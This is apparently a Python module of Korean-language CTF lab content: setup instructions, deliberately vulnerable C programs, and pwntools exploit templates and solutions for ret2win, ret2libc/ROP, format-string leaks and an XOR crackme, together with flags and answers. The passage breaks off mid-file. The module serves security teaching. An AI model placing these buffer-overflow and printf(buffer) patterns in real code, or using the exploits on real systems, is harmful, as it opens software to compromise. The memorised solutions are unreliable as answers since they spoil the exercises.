"""Pwn/Reverse 실습실 콘텐츠.

취약점 스캐너의 CTF 준비 가이드가 "Pwn/Reverse는 실제 바이너리 실습이 필요하다"고
안내하는 부분을 실제로 채우기 위한 모듈. 여기서는 텍스트 분석이 아니라 진짜
컴파일 가능한 C 소스와 gdb/Ghidra 사용 절차, 힌트, 모범 답안을 제공한다.

FLAGS는 CHALLENGES와 분리해 둔다 — /challenges 응답에는 포함하지 않고,
/verify 엔드포인트에서 서버 측 비교에만 사용해 네트워크 탭만 봐서는 정답을
알 수 없게 한다 (그래도 소스 코드 자체는 공개하므로, crackme의 경우 인코딩된
바이트를 실제로 XOR 디코딩해야 답을 알 수 있다 — 이게 리버싱 연습의 핵심이다).
"""

DOCKERFILE = """FROM ubuntu:22.04

RUN apt-get update && apt-get install -y --no-install-recommends \\
        build-essential gdb gdbserver python3 python3-pip git curl ca-certificates \\
    && pip3 install --no-cache-dir pwntools \\
    && git clone --depth 1 https://github.com/pwndbg/pwndbg /opt/pwndbg \\
    && cd /opt/pwndbg && ./setup.sh \\
    && apt-get clean && rm -rf /var/lib/apt/lists/*

WORKDIR /lab
CMD ["/bin/bash"]
"""

LAB_SETUP = {
    "title": "0단계: 실습 환경 먼저 준비하기 (Docker 또는 WSL + Ghidra)",
    "intro": (
        "gdb/pwndbg는 리눅스 환경이 필요합니다. 아래 두 방법 중 하나로 리눅스 셸을 준비한 뒤 "
        "챌린지를 시작하세요. 둘 다 준비할 필요는 없고, 편한 쪽 하나만 끝까지 따라가면 됩니다."
    ),
    "prereq_checklist": [
        "Windows 10(버전 2004 이상) 또는 Windows 11 확인 (이 항목은 이미 대부분 충족됩니다)",
        "방법 A(Docker) 또는 방법 B(WSL) 중 하나를 선택",
        "선택한 방법대로 환경을 준비하고 아래 확인 명령으로 정상 작동을 검증",
        "실습 도구(gcc, gdb, pwntools, pwndbg) 설치 확인",
    ],
    "which_to_choose": (
        "Docker: 컨테이너를 매번 새로 띄우므로 실습 환경을 깨끗한 상태로 재현하기 쉽습니다. "
        "이미 Docker Desktop이 설치되어 있다면 가장 빠른 선택지입니다.\n"
        "WSL 네이티브: 한 번 설치해두면 도구가 계속 남아있고, VS Code의 WSL 확장과 연동하기 편합니다. "
        "둘 다 결국 '리눅스 셸에서 gcc/gdb를 쓴다'는 점은 동일합니다."
    ),
    "docker_path": {
        "title": "방법 A: Docker Desktop으로 실습 환경 켜기",
        "steps": [
            "Windows 검색(돋보기)에서 'Docker Desktop'을 입력해 실행합니다.",
            "최초 실행이라면 이용약관에 동의하고, 'Use WSL 2 based engine' 옵션은 기본값(체크됨)을 그대로 둡니다.",
            "시스템 트레이(작업표시줄 오른쪽)의 고래 아이콘이 움직이다가 멈추고 'Docker Desktop is running' 상태가 될 때까지 기다립니다 (수십 초~1분).",
            "터미널에서 docker info 를 실행해 에러 없이 정보가 출력되면 데몬이 켜진 것입니다. ('cannot connect' 에러가 나오면 아직 켜지는 중이거나 실행되지 않은 것입니다.)",
            "(선택) Docker Desktop 설정(Settings) → General → 'Start Docker Desktop when you log in' 체크 — 매번 수동 실행하지 않아도 됩니다.",
            "이 페이지에서 Dockerfile을 다운로드해 챌린지 소스 파일들과 같은 폴더에 저장합니다.",
            "그 폴더에서: docker build -t pwnlab .   (최초 1회, 이미지 빌드에 몇 분 걸릴 수 있음)",
            "docker run --rm -it -v \"$(pwd)\":/lab pwnlab   (컨테이너 실행, 현재 폴더가 /lab에 마운트됨)",
            "컨테이너 프롬프트가 뜨면 준비 완료 — cd /lab 후 각 챌린지의 빌드 명령을 그대로 실행하면 됩니다.",
        ],
        "troubleshooting": [
            "'WSL 2 installation is incomplete' 오류: 관리자 권한 PowerShell에서 wsl --update 실행 후 Docker Desktop을 다시 시작하세요.",
            "가상화 관련 오류: BIOS/UEFI에서 가상화 기능(Intel VT-x 또는 AMD-V)이 꺼져 있을 수 있습니다. 재부팅 후 BIOS 진입(보통 Del 또는 F2)해 활성화하세요.",
            "고래 아이콘이 계속 로딩 중이라면 Windows를 완전히 재부팅한 뒤 다시 시도해보세요.",
        ],
    },
    "wsl_path": {
        "title": "방법 B: WSL에 리눅스 배포판 직접 설치하기",
        "steps": [
            "시작 메뉴에서 PowerShell을 검색해 '관리자 권한으로 실행'합니다.",
            "wsl --install -d Ubuntu-22.04 를 입력합니다. (WSL 기능 자체는 이미 활성화되어 있는 경우가 많아 배포판만 받으면 되는 경우가 대부분입니다. 다른 배포판 목록은 wsl --list --online 으로 확인할 수 있고, 펜테스트 도구가 미리 담긴 kali-linux 를 선택해도 됩니다.)",
            "설치가 끝나면 재부팅이 필요할 수 있습니다. 재부팅 후 Ubuntu 터미널이 자동으로 열리며 리눅스용 사용자명/비밀번호 설정을 요구합니다 (Windows 계정과 무관하게 새로 정하면 됩니다).",
            "확인: PowerShell에서 wsl --list --verbose 실행 — Ubuntu-22.04가 목록에 있고 VERSION이 2인지 확인합니다.",
            "이후로는 아무 터미널에서 wsl 만 입력하면 바로 Ubuntu 셸로 들어갈 수 있습니다.",
            "Ubuntu 셸 안에서 실습 도구를 설치합니다:\nsudo apt update\nsudo apt install -y build-essential gdb gdbserver python3 python3-pip git\npip3 install pwntools\ngit clone --depth 1 https://github.com/pwndbg/pwndbg ~/pwndbg\ncd ~/pwndbg && ./setup.sh",
            "다운로드한 챌린지 소스 파일은 WSL 파일시스템 안으로 복사해서 쓰는 것을 권장합니다 (성능·권한 문제 예방): cp -r /mnt/c/Users/<사용자명>/Downloads/pwn-lab ~/pwn-lab",
        ],
        "troubleshooting": [
            "'wsl' 명령을 찾을 수 없다는 오류: Windows 업데이트가 오래된 경우입니다. Microsoft Store에서 'Windows 터미널'을 설치하고 최신 Windows 업데이트를 적용하세요.",
            "설치 중 '이 배포판은 이미 설치되어 있습니다' 메시지가 나오면 wsl --list --verbose 로 이미 설치된 배포판인지 먼저 확인하세요.",
            "느리다면 챌린지 파일이 /mnt/c/... (Windows 파일시스템) 경로에 있기 때문일 수 있습니다 — WSL 홈 디렉토리(~/)로 복사해서 작업하면 훨씬 빠릅니다.",
        ],
    },
    "dockerfile": DOCKERFILE,
    "ghidra_note": (
        "Ghidra는 GUI 프로그램이라 Docker/WSL보다 Windows에 직접 설치하는 것을 권장합니다. "
        "NSA가 공개한 오픈소스 리버싱 도구로 github.com/NationalSecurityAgency/ghidra 에서 "
        "릴리스를 받을 수 있습니다. Java(JDK 17+)가 필요하며, 설치 후 File → Import File로 "
        "컴파일된 바이너리를 불러오고 기본 옵션으로 Auto Analyze를 실행하면 됩니다."
    ),
}


def _zw_stego_encode(flag: str, cover: str) -> str:
    """제로폭 유니코드 문자(U+200B/U+200C)로 flag를 cover 텍스트 뒤에 숨긴다.

    보이지 않는 문자를 소스 파일에 리터럴로 직접 박아두면 편집기/개행 변환(CRLF<->LF)·
    인코딩 정규화 과정에서 조용히 깨질 위험이 있다. 그래서 정적 문자열이 아니라 매번
    런타임에 결정론적으로 생성해서 항상 정확한 바이트를 보장한다.
    """
    zws, zwnj = chr(0x200B), chr(0x200C)  # 0, 1
    bits = "".join(format(b, "08b") for b in flag.encode())
    hidden = "".join(zwnj if b == "1" else zws for b in bits)
    return cover + hidden


_MISC_ZW_FLAG = "MISC{z3ro_w1dth_1s_1nv1s1bl3}"
_MISC_ZW_COVER = "The quarterly report has been reviewed and approved by the operations team."
_MISC_ZW_TEXT = _zw_stego_encode(_MISC_ZW_FLAG, _MISC_ZW_COVER)

CHALLENGES = [
    {
        "id": "pwn-ret2win",
        "category": "pwn",
        "title": "ret2win: 스택 버퍼 오버플로우로 숨겨진 함수 호출하기",
        "difficulty": "입문",
        "tool_focus": "gdb",
        "situation": (
            "바이너리 안에는 절대 호출되지 않는 win() 함수가 숨어 있습니다. 사용자 입력을 받는 "
            "vulnerable() 함수는 64바이트 버퍼에 256바이트까지 읽어들여 스택 버퍼 오버플로우가 "
            "발생합니다. 이 취약점으로 실행 흐름을 win()으로 돌려 flag를 출력시키는 것이 목표입니다."
        ),
        "objective": "gdb로 크래시 지점을 찾고, 정확한 오프셋을 계산해 return address를 win()의 주소로 덮어써 봅니다.",
        "source_filename": "ret2win.c",
        "source_code": """// ret2win.c — PWN 101: 기본 스택 버퍼 오버플로우
// gcc -fno-stack-protector -no-pie -o ret2win ret2win.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) {
    printf("\\n[+] Correct! Here is your flag:\\n");
    printf("PWN{r3t2w1n_st4ck_sm4sh1ng_101}\\n");
    fflush(stdout);
}

void vulnerable(void) {
    char buffer[64];
    printf("Enter your name: ");
    fflush(stdout);
    read(0, buffer, 256);   // buffer는 64바이트인데 256바이트까지 읽음 -> 오버플로우
    printf("Hello, %s! Nice to meet you.\\n", buffer);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== ret2win warmup ===\\n");
    printf("There's a hidden win() function somewhere in this binary...\\n");
    vulnerable();
    printf("Goodbye.\\n");
    return 0;
}
""",
        "build_steps": [
            "위 소스를 ret2win.c로 저장합니다 (아래 [소스 다운로드] 버튼 사용 가능).",
            "실습 환경(Docker 컨테이너 또는 WSL) 안에서: gcc -fno-stack-protector -no-pie -o ret2win ret2win.c",
            "-fno-stack-protector: 스택 카나리 비활성화 (입문 단계에서는 카나리 우회까지 배우지 않도록), -no-pie: 실행할 때마다 주소가 바뀌지 않도록 고정 (오프셋 계산에 집중하기 위함)",
            "file ./ret2win 로 64비트 ELF인지 확인, (pwntools가 있다면) checksec --file=ret2win 로 어떤 보호기법이 꺼져 있는지 확인합니다.",
        ],
        "analysis_steps": [
            "objdump -d ret2win | grep -A2 '<win>:' 로 win() 함수의 시작 주소를 확인합니다.",
            "gdb ./ret2win 으로 실행한 뒤 python3 -c \"from pwn import *; print(cyclic(200))\" 으로 만든 패턴을 입력값으로 줍니다.",
            "프로그램이 세그폴트로 죽으면 gdb에서 info registers 로 rip(또는 다음 실행될 주소가 저장된 스택 위치)를 확인합니다.",
            "python3 -c \"from pwn import *; print(cyclic_find(0x<크래시난값>))\" 으로 정확한 오프셋을 계산합니다.",
            "오프셋만큼 채운 뒤 win() 주소를 8바이트 리틀엔디언으로 이어붙인 payload를 다시 넣어 flag가 출력되는지 확인합니다.",
        ],
        "hints": [
            "win()은 main에서 절대 호출되지 않습니다 — objdump나 Ghidra의 Symbol Tree에서 이름으로 직접 찾아야 합니다.",
            "read(0, buffer, 256)에서 버퍼 크기(64)보다 훨씬 큰 256을 읽기 때문에 입력 길이 제한이 사실상 없습니다.",
            "cyclic() 패턴은 4~8바이트 단위로 겹치지 않는 문자열이라, 크래시난 주소값 하나만 알면 정확한 오프셋을 역산할 수 있습니다.",
            "x86-64에서 buffer[64] 바로 다음엔 저장된 rbp(8바이트)가 있고 그 다음이 return address이므로, 오프셋은 대략 72 근처인 경우가 많습니다 — 그래도 반드시 cyclic_find로 직접 확인하세요 (컴파일러/OS에 따라 달라질 수 있습니다).",
        ],
        "exploit_template": """#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2win')
p = process('./ret2win')

# 1) 먼저 gdb + cyclic(200)으로 오프셋을 직접 확인하세요.
OFFSET = None  # TODO: gdb에서 cyclic_find로 확인한 값으로 교체 (예: 72 근처)

win_addr = elf.symbols['win']
log.info(f"win() address: {hex(win_addr)}")

payload = b'A' * OFFSET + p64(win_addr)

p.send(payload)
p.interactive()
""",
        "solution": """1. gcc -fno-stack-protector -no-pie -o ret2win ret2win.c 로 빌드합니다.
2. objdump -d ret2win | grep -A2 '<win>:' 로 win() 주소를 확인합니다 (예: 0x401196 — 실제 값은 환경마다 다릅니다).
3. gdb ./ret2win 실행 후 run 하고, python3 -c "from pwn import *; print(cyclic(200))" 결과를 입력합니다.
4. 세그폴트 후 info registers 로 다음 실행 주소로 쓰이려던 값을 확인하고,
   python3 -c "from pwn import *; print(cyclic_find(0xVALUE))" 로 정확한 오프셋을 구합니다.
5. 아래처럼 exploit.py를 작성해 실행하면 flag가 출력됩니다.

from pwn import *
context.binary = elf = ELF('./ret2win')
p = process('./ret2win')
OFFSET = 72  # 3~4단계에서 직접 구한 값으로 교체
payload = b'A' * OFFSET + p64(elf.symbols['win'])
p.send(payload)
p.interactive()
""",
    },
    {
        "id": "pwn-ret2system",
        "category": "pwn",
        "title": "ret2system: ret2libc 맛보기 — 실제 라이브러리 함수 호출하기",
        "difficulty": "중급",
        "tool_focus": "gdb",
        "situation": (
            "ret2win과 달리 이번에는 '정답 함수'가 없습니다. 대신 system() 함수가 바이너리에 "
            "링크되어 있지만 어디서도 호출되지 않습니다. 스택 버퍼 오버플로우로 system()을 "
            "원하는 인자(cmd 문자열)와 함께 직접 호출하도록 만들어야 합니다 — NX(스택 실행 방지)가 "
            "켜져 있어도 이미 존재하는 라이브러리 코드를 재사용하면(ret2libc) 임의 명령을 실행시킬 "
            "수 있다는 것을 보여주는 챌린지입니다."
        ),
        "objective": "ret2win의 '주소를 찾아 return address를 덮어쓰는' 기술에 더해, x86-64 호출 규약에 맞게 레지스터(rdi)에 인자를 넣는 ROP 가젯 하나를 추가로 사용해 봅니다.",
        "source_filename": "ret2system.c",
        "source_code": """// ret2system.c — PWN 102: ret2libc 맛보기
// gcc -fno-stack-protector -no-pie -o ret2system ret2system.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char cmd[] = "echo PWN{r3t2sy5tem_ropp1ng_w1th_style}";

void unused(void) {
    // 이 함수는 프로그램 흐름상 어디서도 호출되지 않지만,
    // system()의 PLT 항목이 바이너리에 생기도록 남겨둔 것입니다.
    system("echo this line never runs");
}

void gadget_holder(void) {
    // 이 함수도 호출되지 않습니다. 최신 툴체인(Ubuntu 22.04 + gcc 11)으로 빌드하면
    // 바이너리 안에 pop rdi; ret 가젯이 우연히 생기지 않는 경우가 있어(실제로 검증됨),
    // ROPgadget으로 찾을 수 있는 가젯을 이 함수 안에 명시적으로 만들어 둡니다.
    __asm__ __volatile__("pop %rdi\\n\\tret");
}

void vulnerable(void) {
    char buffer[64];
    printf("Enter your name: ");
    fflush(stdout);
    read(0, buffer, 256);   // ret2win과 동일한 오버플로우
    printf("Hello, %s!\\n", buffer);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== ret2system: 이번엔 win()이 없습니다 ===\\n");
    printf("system()은 링크되어 있지만 프로그램 흐름상 절대 호출되지 않습니다.\\n");
    vulnerable();
    printf("Goodbye.\\n");
    return 0;
}
""",
        "build_steps": [
            "위 소스를 ret2system.c로 저장합니다 (아래 [소스 다운로드] 버튼 사용 가능).",
            "실습 환경 안에서: gcc -fno-stack-protector -no-pie -o ret2system ret2system.c",
            "objdump -d ret2system | grep 'system@plt' 로 system()의 PLT 주소를 확인합니다.",
            "objdump -t ret2system | grep ' cmd' (또는 nm ret2system | grep cmd) 로 cmd 문자열(\"echo PWN{...}\")의 주소를 확인합니다.",
        ],
        "analysis_steps": [
            "ret2win과 동일하게 gdb + cyclic(200)으로 return address까지의 정확한 오프셋을 구합니다.",
            "ROPgadget --binary ret2system --only \"pop|ret\" 로 pop rdi; ret 가젯의 주소와, 인자 없는 단독 ret 가젯의 주소를 함께 찾습니다. (x86-64는 함수 인자를 rdi 레지스터로 전달하므로, system(cmd)을 호출하려면 호출 직전에 rdi에 cmd 문자열의 주소를 넣어야 합니다.)",
            "payload = 패딩(OFFSET) + pop_rdi_ret 주소 + cmd 문자열 주소 + ret(정렬용) 주소 + system@plt 주소 순서로 이어붙입니다.",
            "실행 후 화면에 flag(echo 명령의 출력)가 그대로 출력되는지 확인합니다. 만약 아무 출력도 없이 멈춘다면 다음 힌트의 스택 정렬 문제를 의심하세요.",
        ],
        "hints": [
            "system()은 unused() 함수 안에서만 호출되지만, 이 함수 자체가 호출되지 않아도 컴파일된 바이너리에는 system()의 PLT 항목이 남아있습니다.",
            "cmd는 포인터가 아니라 char 배열로 선언되어 있어, cmd의 주소 자체가 그 문자열(\"echo PWN{...}\")의 실제 위치입니다.",
            "x86-64 System V 호출 규약에서 함수의 첫 번째 인자는 rdi 레지스터에 담깁니다 — 그래서 'pop rdi; ret' 가젯이 필요합니다.",
            "payload 순서를 헷갈리지 마세요: [pop rdi 가젯 주소] 다음에 오는 값이 rdi에 들어갈 값(cmd 문자열 주소)이고, 그 다음이 system 주소로 이어지는 부분입니다.",
            "system@plt로 바로 점프했는데 아무 출력도 없이 조용히 멈춘다면, 최신 glibc(Ubuntu 22.04 기준)는 내부적으로 16바이트 스택 정렬을 요구하는 SSE 명령어(movaps 등)를 쓰기 때문일 가능성이 높습니다 — pop_rdi_ret과 system@plt 주소 사이에 인자 없는 'ret' 가젯 하나를 더 끼워 넣어 정렬을 맞추면 해결됩니다 (실제로 이 스택 레이아웃에서 검증된 내용입니다).",
        ],
        "exploit_template": """#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2system')
p = process('./ret2system')

# 1) ret2win과 동일하게 gdb + cyclic(200)으로 오프셋을 먼저 확인하세요.
OFFSET = None  # TODO

# 2) 필요한 주소들을 확인하세요.
system_addr = elf.plt['system']
cmd_addr = elf.symbols['cmd']
pop_rdi_ret = None  # TODO: ROPgadget --binary ret2system --only "pop|ret" 로 확인
ret_only = None      # TODO: 위 목록에서 인자 없는 단독 'ret' 가젯 주소 (스택 16바이트 정렬용)

log.info(f"system@plt: {hex(system_addr)}")
log.info(f"cmd (\\"echo PWN{{...}}\\"): {hex(cmd_addr)}")

payload = b'A' * OFFSET
payload += p64(pop_rdi_ret)
payload += p64(cmd_addr)
payload += p64(ret_only)     # system() 진입 전 스택을 16바이트로 재정렬 (없으면 SIGSEGV로 조용히 죽음)
payload += p64(system_addr)

p.send(payload)
print(p.recvall(timeout=3).decode(errors="replace"))
""",
        "solution": """1. gcc -fno-stack-protector -no-pie -o ret2system ret2system.c 로 빌드합니다.
2. gdb + cyclic(200)으로 return address까지의 오프셋을 구합니다 (ret2win과 동일한 방법).
3. objdump -d ret2system | grep 'system@plt' 로 system의 PLT 주소를 확인합니다.
4. objdump -t ret2system | grep ' cmd' 로 cmd 문자열("echo PWN{...}")의 주소를 확인합니다.
5. ROPgadget --binary ret2system --only "pop|ret" 로 pop rdi; ret 가젯 주소와 단독 ret 가젯 주소를 확인합니다.
6. 아래처럼 exploit.py를 작성해 실행합니다:

from pwn import *
context.binary = elf = ELF('./ret2system')
p = process('./ret2system')
OFFSET = 72  # 직접 구한 값으로 교체
payload = b'A' * OFFSET
payload += p64(POP_RDI_RET)          # 3~5단계에서 구한 가젯 주소
payload += p64(elf.symbols['cmd'])   # cmd 문자열("echo PWN{...}") 주소
payload += p64(RET_ONLY)             # system() 호출 전 스택 16바이트 정렬용 (없으면 SIGSEGV)
payload += p64(elf.plt['system'])    # system@plt 주소
p.send(payload)
print(p.recvall(timeout=3).decode(errors="replace"))

주의: RET_ONLY(정렬용 ret) 가젯이 없으면 최신 glibc(Ubuntu 22.04 기준)의 system() 내부에서
movaps 같은 SSE 명령어가 16바이트로 정렬되지 않은 스택 때문에 SIGSEGV로 조용히 죽어버립니다.
아무 출력도 없이 멈춘다면 이 정렬 문제부터 의심하세요.

7. system(cmd)이 실행되며 "echo PWN{...}" 명령의 출력, 즉 flag가 화면에 나타납니다:
   PWN{r3t2sy5tem_ropp1ng_w1th_style}

실전에서는 cmd가 "/bin/sh"인 경우가 많아 대화형 셸을 얻지만, 이 챌린지에서는 검증하기
쉽도록 flag를 직접 출력하는 명령으로 구성했습니다. 원리는 동일합니다.
""",
    },
    {
        "id": "pwn-fmtstr",
        "category": "pwn",
        "title": "fmtstr: 포맷 스트링 취약점으로 스택 값 읽어내기",
        "difficulty": "중급",
        "tool_focus": "gdb",
        "situation": (
            "지금까지는 모두 '스택 버퍼 오버플로우'였습니다. 이번엔 완전히 다른 취약점입니다: "
            "사용자 입력이 printf의 포맷 문자열로 그대로 사용됩니다. 이 프로그램은 스택에 숨겨진 "
            "secret 값을 정확히 맞히면 flag를 보여줍니다."
        ),
        "objective": "포맷 스트링 취약점(%x, %p, %N$lx)으로 스택에 있는 임의의 값을 읽어내는(Arbitrary Read) 기법을 익힙니다. 실전에서는 이 기법으로 스택 카나리·ASLR 베이스 주소를 유출해 다른 공격과 조합합니다.",
        "source_filename": "fmtstr.c",
        "source_code": """// fmtstr.c — PWN 103: 포맷 스트링 취약점
// gcc -fno-stack-protector -no-pie -o fmtstr fmtstr.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag(void) {
    printf("PWN{f0rm4t_str1ng_1nf0_l34k}\\n");
    fflush(stdout);
}

int main(void) {
    char buffer[128];
    unsigned long secret = 0xdeadbeefcafebabeUL;

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== fmtstr: 포맷 스트링으로 숨겨진 secret 값을 알아내면 flag가 열립니다 ===\\n");

    printf("1) 아래 입력은 그대로 printf의 포맷 문자열로 사용됩니다.\\n");
    printf("Input: ");
    fflush(stdout);
    memset(buffer, 0, sizeof(buffer));
    if (fgets(buffer, sizeof(buffer), stdin) == NULL) return 1;
    buffer[strcspn(buffer, "\\n")] = 0;
    printf(buffer);   // 취약점: 사용자 입력을 포맷 문자열로 그대로 사용
    printf("\\n\\n");

    printf("2) secret 값을 알아냈다면 16진수로 입력하세요 (예: deadbeefcafebabe)\\n");
    printf("Guess: ");
    fflush(stdout);
    char guess[64];
    memset(guess, 0, sizeof(guess));
    if (fgets(guess, sizeof(guess), stdin) == NULL) return 1;
    unsigned long guessed = strtoul(guess, NULL, 16);

    if (guessed == secret) {
        print_flag();
    } else {
        printf("틀렸습니다. secret은 스택 어딘가에 있습니다 — 위치(%%N$lx)를 다시 찾아보세요.\\n");
    }
    return 0;
}
""",
        "build_steps": [
            "위 소스를 fmtstr.c로 저장합니다 (아래 [소스 다운로드] 버튼 사용 가능).",
            "실습 환경 안에서: gcc -fno-stack-protector -no-pie -o fmtstr fmtstr.c",
            "(printf(buffer)에 대한 -Wformat-security 경고가 뜰 수 있는데, 이 챌린지에서는 의도된 것이므로 무시해도 됩니다.)",
        ],
        "analysis_steps": [
            "./fmtstr 를 실행하고 첫 입력에 %1$lx.%2$lx.%3$lx. ... 처럼 %N$lx를 30개 이상 넉넉히 이어붙여 스택 값들을 순서대로 출력해봅니다 (실제로 검증한 이 빌드 환경에서는 31번째 인자 근처에서 나타났습니다 — 컴파일러/환경에 따라 달라질 수 있으니 10개 정도로는 부족할 수 있습니다).",
            "출력된 값들 중 deadbeefcafebabe 패턴(혹은 그 일부)이 보이는 위치를 찾습니다.",
            "%N$lx 형식(예: %31$lx)으로 정확히 그 위치 하나만 지정해서 값을 다시 확인합니다.",
            "찾은 값을 두 번째 입력(Guess)에 16진수 그대로(deadbeefcafebabe) 입력하면 flag가 출력됩니다.",
        ],
        "hints": [
            "%p는 포인터 형식(0x가 붙은 16진수)으로, %lx는 8바이트 16진수로 스택 값을 출력합니다.",
            "printf(buffer)처럼 두 번째 인자 없이 포맷 문자열만 있으면, %x/%p/%lx는 실제로는 존재하지 않는 인자 대신 레지스터와 스택에 남아있던 값을 그대로 읽어옵니다.",
            "몇 번째(%N$) 인자인지는 컴파일러/환경마다 다를 수 있습니다 — 처음부터 순서대로(%1$lx, %2$lx, ...) 넓게(최소 30~40개까지) 스캔해보세요. 이 실습실 빌드 환경에서 실제로 검증한 위치는 %31$lx였습니다.",
            "값이 정확히 deadbeefcafebabe로 보이는 위치가 정답입니다. 일부만 보이면(예: 4바이트만) %lx 대신 %x를 두 번 조합해보세요.",
        ],
        "solution": """1. gcc -fno-stack-protector -no-pie -o fmtstr fmtstr.c 로 빌드합니다.
2. 실행 후 첫 입력에 다음처럼 넣어 스택을 넓게(최소 30개 이상) 스캔합니다:
   %1$lx.%2$lx.%3$lx. ... .%35$lx   (파이썬으로 '.'.join(f'%{i}$lx' for i in range(1,36)) 처럼 생성하면 편합니다)
3. 출력 중 deadbeefcafebabe 값이 보이는 위치(%N$)를 확인합니다 (이 빌드 환경에서 실제로 검증한 위치는 31번째였습니다 — %1~%10만 스캔하면 못 찾을 수 있으니 주의하세요).
4. 두 번째 입력(Guess)에 정확히 deadbeefcafebabe 를 입력합니다.
5. flag가 출력됩니다: PWN{f0rm4t_str1ng_1nf0_l34k}

실전 팁: 이 챌린지에서는 값을 '맞히기만' 했지만, 실제 공격에서는 이 기법으로 스택 카나리나
리턴 주소(ASLR이 걸린 코드/라이브러리 베이스 계산용)를 유출해 ret2win·ret2libc 공격과
조합하는 경우가 많습니다.
""",
    },
    {
        "id": "reverse-crackme",
        "category": "reverse",
        "title": "crackme v1: Ghidra로 비밀번호 로직 분석하기",
        "difficulty": "입문",
        "tool_focus": "ghidra",
        "situation": (
            "비밀번호를 입력받아 맞으면 flag를 출력하는 프로그램입니다. 소스 없이 컴파일된 "
            "바이너리만 주어졌다고 가정하고, Ghidra로 디컴파일해 올바른 비밀번호를 알아내는 것이 목표입니다."
        ),
        "objective": "Ghidra의 디컴파일러로 check() 함수의 로직(XOR 비교)을 읽고, 인코딩된 바이트를 직접 디코딩해 정답을 찾아봅니다.",
        "source_filename": "crackme.c",
        "source_code": """// crackme.c — REVERSE 101: XOR 인코딩 크랙미
// gcc -no-pie -o crackme crackme.c
#include <stdio.h>
#include <string.h>

static int check(const char *input) {
    static const unsigned char encoded[] = {
        0x0c, 0x23, 0x7a, 0x2f, 0x39, 0x2a, 0x14, 0x1b, 0x39, 0x7b, 0x6a, 0x6a
    };
    static const unsigned char key = 0x4b;
    size_t len = sizeof(encoded);

    if (strlen(input) != len) {
        return 0;
    }
    for (size_t i = 0; i < len; i++) {
        if ((unsigned char)(input[i] ^ key) != encoded[i]) {
            return 0;
        }
    }
    return 1;
}

int main(void) {
    char input[128];
    printf("=== crackme v1 ===\\n");
    printf("Enter the password: ");
    fflush(stdout);
    if (scanf("%127s", input) != 1) {
        return 1;
    }
    if (check(input)) {
        printf("Access granted!\\n");
        printf("RE{gh1dra_and_x0r_ar3_fr1ends}\\n");
    } else {
        printf("Access denied.\\n");
    }
    return 0;
}
""",
        "build_steps": [
            "위 소스를 crackme.c로 저장합니다 (아래 [소스 다운로드] 버튼 사용 가능).",
            "실습 환경 안에서: gcc -no-pie -o crackme crackme.c",
            "실전에서는 소스 없이 바이너리 파일(crackme)만 Ghidra에 넣는다고 가정하고 진행하세요.",
        ],
        "analysis_steps": [
            "Ghidra에서 File → New Project → 바이너리(crackme)를 Import 합니다.",
            "더블클릭해 CodeBrowser를 열고, 'Analyze this file now?'에 Yes를 눌러 기본 옵션으로 분석합니다.",
            "왼쪽 Symbol Tree에서 Functions → main을 찾아 오른쪽 Decompile 창에서 로직을 읽습니다.",
            "main이 호출하는 check() 함수로 이동해, 반복문 안의 XOR 연산과 고정된 바이트 배열을 확인합니다.",
            "배열 값과 key를 옮겨 적은 뒤, Python으로 각 바이트를 key와 XOR해 원래 문자열(비밀번호)을 복원합니다.",
            "복원한 비밀번호를 실제로 crackme를 실행해 입력하고 flag가 출력되는지 확인합니다.",
        ],
        "hints": [
            "Ghidra 디컴파일 결과에서 check() 함수 안에 unsigned char 배열과 반복문이 보일 것입니다.",
            "반복문 안에서 input[i] ^ key 값을 encoded[i]와 비교합니다 — 즉 encoded[i] ^ key 가 원래 문자입니다.",
            "XOR는 같은 키로 두 번 연산하면 원래 값으로 돌아옵니다: (byte ^ key) ^ key == byte.",
            "배열 전체를 key와 XOR한 뒤 각 값을 아스키 문자로 바꾸면 비밀번호 문자열이 나옵니다.",
        ],
        "solution": """1. gcc -no-pie -o crackme crackme.c 로 빌드합니다.
2. Ghidra로 crackme를 Import → Auto Analyze → main() 디컴파일을 확인합니다.
3. main이 check()를 호출하는 것을 확인하고 check() 디컴파일을 엽니다.
4. 아래와 같은 배열과 key, XOR 비교 로직이 보입니다:
   encoded = {0x0c,0x23,0x7a,0x2f,0x39,0x2a,0x14,0x1b,0x39,0x7b,0x6a,0x6a}, key = 0x4b
5. 파이썬으로 디코딩합니다:

   encoded = [0x0c,0x23,0x7a,0x2f,0x39,0x2a,0x14,0x1b,0x39,0x7b,0x6a,0x6a]
   key = 0x4b
   password = ''.join(chr(b ^ key) for b in encoded)
   print(password)  # Gh1dra_Pr0!!

6. ./crackme 를 실행해 'Gh1dra_Pr0!!'를 입력하면 flag가 출력됩니다.
""",
    },
    {
        "id": "reverse-keygen",
        "category": "reverse",
        "title": "keygen_check: 알고리즘 기반 시리얼 검증 분석하기",
        "difficulty": "중급",
        "tool_focus": "ghidra",
        "situation": (
            "crackme v1은 '고정된 하나의 정답'을 찾는 문제였습니다. 이번엔 다릅니다 — 이 프로그램은 "
            "'XXXX-XXXX' 형식의 시리얼을 받아 자릿수마다 가중치를 곱한 합(체크섬)이 특정 값과 같은지만 "
            "확인합니다. 즉 정답이 하나가 아니라 조건을 만족하는 시리얼이 여러 개 존재합니다."
        ),
        "objective": "Ghidra로 가중합(체크섬) 알고리즘을 읽어내고, 정답을 '찾는' 것이 아니라 조건을 만족하는 시리얼을 '만들어내는'(keygen) 사고방식을 연습합니다.",
        "source_filename": "keygen_check.c",
        "source_code": """// keygen_check.c — REVERSE 102: 알고리즘 기반 시리얼 검증
// gcc -no-pie -o keygen_check keygen_check.c
#include <stdio.h>
#include <string.h>

// 시리얼 형식: NNNN-NNNN (숫자 8자리 + 하이픈)
static int check_serial(const char *serial) {
    if (strlen(serial) != 9) return 0;
    if (serial[4] != '-') return 0;

    int sum = 0;
    for (int i = 0; i < 9; i++) {
        if (i == 4) continue;
        if (serial[i] < '0' || serial[i] > '9') return 0;
        sum += (serial[i] - '0') * (i + 1);   // 자릿수 위치에 따른 가중합
    }
    return sum == 250;
}

int main(void) {
    char input[32];
